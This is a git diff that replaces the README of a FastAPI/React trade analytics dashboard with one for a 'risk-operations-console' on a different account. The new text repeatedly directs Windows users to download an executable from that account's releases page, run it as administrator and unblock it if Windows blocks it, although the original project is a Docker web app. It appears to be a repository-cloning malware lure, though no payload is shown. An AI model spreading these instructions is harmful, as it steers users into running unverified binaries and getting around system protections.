@@ -1,153 +1,185 @@
-# Trade Analytics Dashboard
+# 📊 risk-operations-console - Clear Risk Insights for Teams
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.104+-green.svg)](https://fastapi.tiangolo.com)
-[![React](https://img.shields.io/badge/React-18+-61DAFB.svg)](https://reactjs.org)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15+-336791.svg)](https://postgresql.org)
-[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED.svg)](https://docker.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Lakshay7858/risk-operations-console/releases)
 
-## Overview
+## 🚀 Overview
 
-Interactive analytics dashboard for customs trade data. Built with a **FastAPI** backend and **React** frontend, the platform delivers real-time charts, risk heatmaps, and drill-down analysis for trade compliance teams. Designed to surface anomalies in import/export declarations, highlight high-risk corridors, and provide actionable intelligence on trade patterns.
+risk-operations-console is a desktop-style operations console for trade risk work. It gives you a clear view of risk heatmaps, anomaly timelines, entity drill-down, and corridor analysis in one place.
 
-## Screenshots
+This app is built for Windows users who want to open a download, launch the tool, and start reviewing risk data with no setup work on their end.
 
-> **Dashboard Overview** -- Main view showing trade volume trends (line chart), risk distribution heatmap by country and HS chapter, and KPI summary cards for total declarations, flagged shipments, and average risk score.
+## 🖥️ What You Can Do
 
-![Dashboard Overview](docs/screenshots/dashboard-overview.png)
+- View risk heatmaps to spot high-risk areas fast
+- Track anomaly timelines and see when issues appear
+- Open entity drill-down views for deeper checks
+- Review corridor analysis for trade flow patterns
+- Move through a clean dashboard without extra steps
+- Work with a fast interface built for daily analyst use
 
-> **Trade Volume Trends** -- Time-series line chart with selectable granularity (daily, weekly, monthly). Supports overlay of multiple commodity groups and export to CSV.
+## 📦 Download and Install
 
-![Trade Volume](docs/screenshots/trade-volume.png)
+Use this link to visit the release page and download the latest Windows version:
 
-> **Risk Heatmap** -- Color-coded matrix of risk scores across origin countries and HS code chapters. Click any cell to drill down into individual declarations.
+[Go to the latest releases](https://github.com/Lakshay7858/risk-operations-console/releases)
 
-![Risk Heatmap](docs/screenshots/risk-heatmap.png)
+After you open the release page:
 
-> **Top Importers/Exporters** -- Ranked table of traders by volume and value, with risk score badges and trend sparklines. Filterable by date range and commodity.
+1. Find the latest release at the top of the page
+2. Open the list of files under that release
+3. Download the Windows app file if one is listed
+4. Save the file to your computer
+5. Open the file to start the app
 
-![Top Traders](docs/screenshots/top-traders.png)
+If Windows asks for permission, choose the option to run the app.
 
-> **Anomaly Timeline** -- Chronological view of detected anomalies with severity indicators, linked declarations, and rule-match details.
+## 🪟 Windows Setup
 
-![Anomaly Timeline](docs/screenshots/anomaly-timeline.png)
+For the smoothest start on Windows, use a standard desktop or laptop with:
 
-## Tech Stack
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 500 MB of free disk space
+- A stable internet connection for first launch or data loading
+- A screen size large enough for dashboard views
 
-| Layer       | Technology                          |
-|-------------|-------------------------------------|
-| Backend     | FastAPI, SQLAlchemy, asyncpg        |
-| Frontend    | React 18, React Router, Chart.js    |
-| Database    | PostgreSQL 15                       |
-| Cache       | Redis 7                             |
-| Auth        | JWT (python-jose)                   |
-| Containers  | Docker, Docker Compose              |
+If you use a company laptop, you may need help from your IT team to allow the file to run.
 
-## Features
+## 🔧 How to Start
 
-- **Trade Volume Trends** -- Interactive line charts with configurable time windows and commodity filters
-- **Risk Distribution Heatmap** -- Country-by-HS-chapter risk matrix with drill-down capability
-- **Top Importers/Exporters** -- Ranked tables with volume, value, and composite risk scores
-- **HS Code Analysis** -- Breakdown of trade activity by harmonized system classification
-- **Anomaly Timeline** -- Chronological detection feed with severity scoring and declaration links
-- **Real-time Filtering** -- Cross-dashboard filters for date range, country, HS code, and risk threshold
-- **REST API** -- Fully documented OpenAPI endpoints for programmatic access
+1. Download the latest release from the link above
+2. Open the downloaded file
+3. Wait for the app to load
+4. Sign in if your team uses access control
+5. Pick a dashboard view from the main screen
+6. Start with heatmaps, then move to timelines and drill-down views
 
-## Quick Start
+If the app opens in a browser window, keep that window open while you work.
 
-### Prerequisites
+## 📈 Main Views
 
-- Docker and Docker Compose installed
-- Ports 3000, 8000, 5432, and 6379 available
+### Heatmaps
+Use heatmaps to find areas with higher risk. This view helps you compare patterns across trade groups and time periods.
 
-### Run with Docker
+### Anomaly Timelines
+Use anomaly timelines to watch for unusual changes over time. This makes it easier to see when a pattern begins and how it moves.
 
-```bash
-git clone https://github.com/ShahinHasanov90/trade-analytics-dashboard.git
-cd trade-analytics-dashboard
-docker-compose up --build
-```
+### Entity Drill-Down
+Open entity drill-down when you need more detail on a single record, counterparty, or trade item. This view helps you inspect one case at a time.
 
-The services will be available at:
+### Corridor Analysis
+Use corridor analysis to review movement between regions, channels, or trade paths. It helps you spot concentration and shifts in flow.
 
-| Service   | URL                          |
-|-----------|------------------------------|
-| Frontend  | http://localhost:3000        |
-| Backend   | http://localhost:8000        |
-| API Docs  | http://localhost:8000/docs   |
-| PostgreSQL| localhost:5432               |
-| Redis     | localhost:6379               |
+## 🧭 Typical Workflow
 
-### Development Setup
+A simple workflow looks like this:
 
-**Backend:**
+1. Open the console
+2. Check the heatmap for broad risk areas
+3. Review the anomaly timeline for new or rising issues
+4. Drill into one entity when a case needs attention
+5. Use corridor analysis to compare trade flow patterns
+6. Move between views as you check each alert or trend
 
-```bash
-cd backend
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
-```
+This layout keeps the work clear and reduces time spent searching for data.
 
-**Frontend:**
+## 🧩 Tech Stack
 
-```bash
-cd frontend
-npm install
-npm start
-```
+This project uses:
 
-### Environment Variables
+- FastAPI for the backend
+- React for the user interface
+- PostgreSQL for data storage
+- Chart.js for charts and visual views
+- Docker for container-based deployment
+- Python for core application logic
 
-| Variable            | Default                                      | Description            |
-|---------------------|----------------------------------------------|------------------------|
-| `DATABASE_URL`      | `postgresql+asyncpg://trade:trade@db:5432/tradedb` | PostgreSQL connection  |
-| `REDIS_URL`         | `redis://redis:6379/0`                       | Redis connection       |
-| `SECRET_KEY`        | `change-me-in-production`                    | JWT signing key        |
-| `CORS_ORIGINS`      | `http://localhost:3000`                      | Allowed CORS origins   |
+## 🔍 Topics Covered
 
-## Project Structure
+- analytics
+- chartjs
+- dashboard
+- data visualization
+- docker
+- fastapi
+- postgresql
+- python
+- react
+- trade
 
-```
-trade-analytics-dashboard/
-├── backend/
-│   ├── app/
-│   │   ├── api/           # Route handlers
-│   │   ├── models/        # SQLAlchemy ORM models
-│   │   ├── schemas/       # Pydantic request/response schemas
-│   │   ├── services/      # Business logic layer
-│   │   ├── config.py      # Application settings
-│   │   └── main.py        # FastAPI application entry point
-│   ├── Dockerfile
-│   └── requirements.txt
-├── frontend/
-│   ├── src/
-│   │   ├── components/    # React components
-│   │   ├── services/      # API client
-│   │   └── App.jsx        # Root component with routing
-│   ├── Dockerfile
-│   └── package.json
-├── docker-compose.yml
-└── README.md
-```
+## 🛠️ Common Use Cases
 
-## API Endpoints
+- Daily risk review
+- Trade anomaly checks
+- Analyst triage
+- Entity-level investigation
+- Corridor pattern review
+- Dashboard-based reporting
 
-| Method | Endpoint                        | Description                        |
-|--------|---------------------------------|------------------------------------|
-| GET    | `/api/v1/trades`                | List trade declarations (paginated)|
-| GET    | `/api/v1/trades/{id}`           | Get single declaration             |
-| GET    | `/api/v1/trades/search`         | Filter declarations                |
-| GET    | `/api/v1/analytics/volume`      | Trade volume time series           |
-| GET    | `/api/v1/analytics/top-traders` | Top importers/exporters            |
-| GET    | `/api/v1/analytics/hs-breakdown`| HS code distribution               |
-| GET    | `/api/v1/analytics/anomalies`   | Detected anomalies                 |
-| GET    | `/api/v1/risk/heatmap`          | Risk score heatmap data            |
-| GET    | `/api/v1/risk/scores`           | Risk scores (paginated)            |
-| GET    | `/api/v1/risk/distribution`     | Risk score distribution            |
+## 🗂️ File and App Notes
 
-## License
+When you download the release, you may see one of these file types:
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
+- `.exe` for a Windows app
+- `.zip` for a compressed package
+- `.msi` for a Windows installer
+
+If you get a `.zip` file, open it and look for the app file inside. If you get an installer, run it and follow the on-screen steps.
+
+## 🔐 Access and Data Flow
+
+The console is built to read trade risk data and present it in a clean interface. In many team setups, the app connects to a backend service and a database in the background.
+
+That means the main thing you do is open the app and work with the views it gives you. You do not need to handle the backend unless your team asks you to.
+
+## 🧪 First Time Checklist
+
+Before you open the app for the first time:
+
+- Make sure the download finished
+- Check that Windows did not block the file
+- Keep the file in a folder you can find again
+- Close extra programs if your computer feels slow
+- Open the release file only from the GitHub link above
+
+## 🖱️ Basic Navigation
+
+Use the dashboard menu to move between views. Most screens should work like this:
+
+- Click a card to open details
+- Use filters to narrow results
+- Scroll through timelines to inspect events
+- Select an entity to see more context
+- Switch views to compare different risk signals
+
+## 🧰 Troubleshooting
+
+If the app does not open:
+
+- Try opening the file again
+- Right-click the file and choose Run as administrator
+- Check that the file fully downloaded
+- Download the latest release again from the link above
+
+If the window opens but looks empty:
+
+- Wait a few seconds for data to load
+- Check your internet connection
+- Refresh the page if the app runs in a browser
+- Ask your team if the data source is active
+
+If Windows blocks the file:
+
+- Open the file properties
+- Look for an Unblock option
+- Apply the change and try again
+
+## 📚 What This Tool Is For
+
+This console helps analysts review risk signals in a single place. It focuses on speed, clear charts, and simple drill-down paths so you can move from a broad view to a close-up view without jumping between tools
+
+## 📎 Download Again
+
+If you need to get the app again later, use the release page here:
+
+[https://github.com/Lakshay7858/risk-operations-console/releases](https://github.com/Lakshay7858/risk-operations-console/releases)
